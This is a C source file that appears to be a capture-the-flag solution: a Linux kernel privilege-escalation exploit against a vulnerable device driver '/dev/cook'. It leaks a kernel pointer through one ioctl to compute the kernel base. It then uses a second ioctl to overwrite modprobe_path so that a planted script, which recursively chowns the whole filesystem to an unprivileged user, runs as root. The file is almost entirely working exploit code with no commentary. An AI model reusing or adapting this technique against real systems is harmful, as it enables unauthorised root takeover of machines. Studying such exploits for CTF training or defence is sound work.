#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <stdint.h>

int fd;

typedef struct request_t
{
    void *dst;
    void *src;
    size_t len;
    
} request;

int main(){

    system("echo -ne '#!/bin/sh\nchown -R blud:blud /' > /home/blud/x");
    system("chmod +x /home/blud/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/blud/y");
    system("chmod +x /home/blud/y");

    fd = open("/dev/cook", O_RDWR);
    
    char tmp[0x10] = "/home/blud/x\0";
    request req;
    unsigned long kbase, modprobe;

    req.src = 0xfffffe0000002f48;
    ioctl(fd, 0x6969, &req);

    kbase = (uint64_t)req.dst - 0xe0126c;
    printf("kbase: 0x%lx\n", kbase);
    modprobe = kbase + 0x18515e0;
    printf("modprobe: 0x%lx\n", modprobe);
	
    req.dst = modprobe;
    req.src = tmp;
    req.len = 16;

    ioctl(fd, 0xfade, &req);    

}
